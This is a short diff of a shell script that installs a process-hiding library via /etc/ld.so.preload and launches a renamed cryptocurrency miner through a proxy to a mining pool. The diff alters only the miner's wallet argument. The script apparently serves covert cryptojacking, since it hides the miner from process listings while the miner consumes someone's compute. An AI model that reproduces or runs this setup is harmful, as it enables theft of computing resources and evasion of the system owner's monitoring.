@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=ssl://0x4EE351b518733AdbA8AEe4fbFd64BCE2061b3ebd@Modal_Nikah.eth-us-west.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=ssl://eth-us-west.flexpool.io:5555 - wal 0x4EE351b518733AdbA8AEe4fbFd64BCE2061b3ebd.Modal_Nikah --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
